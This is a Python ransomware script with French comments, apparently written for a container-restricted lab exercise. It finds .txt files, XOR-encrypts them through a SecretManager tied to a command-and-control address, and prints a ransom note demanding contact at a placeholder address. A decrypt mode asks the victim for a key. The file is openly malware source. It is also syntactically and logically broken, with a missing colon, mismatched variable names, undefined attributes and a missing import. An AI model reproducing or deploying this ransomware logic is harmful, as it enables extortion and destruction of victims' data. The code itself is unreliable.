import logging
import socket
import re
import sys
from pathlib import Path
from secret_manager import SecretManager


CNC_ADDRESS = "cnc:6666"
TOKEN_PATH = "/root/token"

ENCRYPT_MESSAGE = """
  _____                                                                                           
 |  __ \                                                                                          
 | |__) | __ ___ _ __   __ _ _ __ ___   _   _  ___  _   _ _ __   _ __ ___   ___  _ __   ___ _   _ 
 |  ___/ '__/ _ \ '_ \ / _` | '__/ _ \ | | | |/ _ \| | | | '__| | '_ ` _ \ / _ \| '_ \ / _ \ | | |
 | |   | | |  __/ |_) | (_| | | |  __/ | |_| | (_) | |_| | |    | | | | | | (_) | | | |  __/ |_| |
 |_|   |_|  \___| .__/ \__,_|_|  \___|  \__, |\___/ \__,_|_|    |_| |_| |_|\___/|_| |_|\___|\__, |
                | |                      __/ |                                               __/ |
                |_|                     |___/                                               |___/ 

Your txt files have been locked. Send an email to evil@hell.com with title '{token}' to unlock your data. 
"""
class Ransomware:
    def __init__(self) -> None:
        self.check_hostname_is_docker()
    
    def check_hostname_is_docker(self)->None:
        # At first, we check if we are in a docker
        # to prevent running this program outside of container
        hostname = socket.gethostname()
        result = re.match("[0-9a-f]{6,6}", hostname)
        if result is None:
            print(f"You must run the malware in docker ({hostname}) !")
            sys.exit(1)
    
    def get_files(self, filter: str) -> list[str]: #on retourne une liste contenant des strings
        files = []  # Liste pour stocker nos fichiers
        for fichier in self.directory.rglob(f'*.{filter}'):  #self.directory dossier où on commence notre recherche, rglob permet de de chercher les fichiers ou types de fichiers souhaités
            files.append(str(fichier.resolve()))  # On ajoute le chemin absolu de chaque fichiers texte trouvés à la liste
        return files


    def encrypt(self):
    
        files = self.get_files('*.txt') #on vient récuperer tous les fichier textes 
        if not files
            self.log.error("aucun fichier trouvé")  
        secret_manager = SecretManager(NC_ADDRESS, TOKEN_PATH) #instanciation de l'objet de classe secret manager
        secret_manager.setup()#appel de la méthode setup avec création de la clé, sel et token et création du #repertoire ...
        for  path in files :
            try:
                secret_manager.xorfiles(files)#On applique un xor sur tous les fichiers trouvés 
                print(f"Fichier bien chiffré : {path}")
            except Exception as e:
                print(f"Le fichier n'a pas pu être chiffré {path} : {e}")
        hexa_token = secret_manager.get_hex_token()
        print(ENCRYPT_MESSAGE.format(token=hex_token))#affichage de encrypt_message plus haut et insertion de hex_token dans le token du message

    def decrypt(self):
        secret_manager = SecretManager()#instanciation de l'objet secret manager qui contient les élements #cryptographiques
        secret_manager.load()#chargement de ces éléments
        encrypted_files = [file for file in os.listdir() if file.endswith('.txt')]#chargement de la liste de fichier #dérobée
        while True: 
            b64_key = input("Veuillez entrer la clé de déchiffrement en base64 : ")#on demande ici à la victime la clé #de chiffrement pour pouvoir déchiffrer
            try:
                secret_manager.set_key(b64_key)#on verifie ici si la clé est bonne
                secret_manager.xorfiles(encrypted_files)#on réaplique un xor sur nos fichiers chiffrés avec le xor
                secret_manager.clean()#on nettoie tout derrière nous comme Mr.propre
                print("Vos fichiers ont été restaurés avec succès.")
                break
            except ValueError:
                print("Clé incorrecte, veuillez réessayer.")#si la clé est incorrecte message d'érreur
    

if __name__ == "__main__":
    logging.basicConfig(level=logging.DEBUG)
    if len(sys.argv) < 2:
        ransomware = Ransomware()
        ransomware.encrypt()
    elif sys.argv[1] == "--decrypt":
        ransomware = Ransomware()
        ransomware.decrypt()
